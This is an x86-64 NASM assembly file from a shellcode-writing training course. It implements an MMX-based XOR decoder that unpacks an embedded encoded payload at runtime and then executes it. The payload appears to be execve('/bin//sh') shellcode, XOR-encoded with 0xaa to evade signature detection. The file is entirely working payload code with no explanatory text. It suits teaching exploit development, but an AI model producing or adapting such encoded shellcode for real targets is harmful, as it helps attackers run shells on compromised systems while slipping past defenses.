; Filename: mmx-xor-decoder.nasm
; Author:  Vivek Ramachandran
; Website:  http://securitytube.net
; Training: http://securitytube-training.com
; 041_mmx-xor-decoder
; Purpose:

section .mytext progbits alloc exec write align=16
        global _start
_start:

        jmp short call_decoder

decoder:
        pop rdi                 ; decoder_value
        lea rsi, [rdi +8]       ; first 8 bytes of
        xor rcx, rcx
        mov cl, 4               ; 8 bytes * 4  = 32 bytes of EncodedShellcode memory items

decode:
        movq mm0, qword [rdi]
        movq mm1, qword [rsi]
        pxor mm0, mm1
        movq qword [rsi], mm0
        add rsi, 0x8
        loop decode

        jmp short EncodedShellcode


call_decoder:
        call decoder
        decoder_value: db  \
0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa

        EncodedShellcode: db \
0xe2,0x9b,0x6a,0xfa,0xe2,0x11,0x85,0xc8,0xc3,0xc4,0x85,0x85,0xd9,0xc2,0xf9,0xe2,0x23,0x4d,0xfa,0xe2,0x23,0x48,0xfd,0xe2,0x23,0x4c,0xe2,0x29,0x6a,0x91,0xa5,0xaf

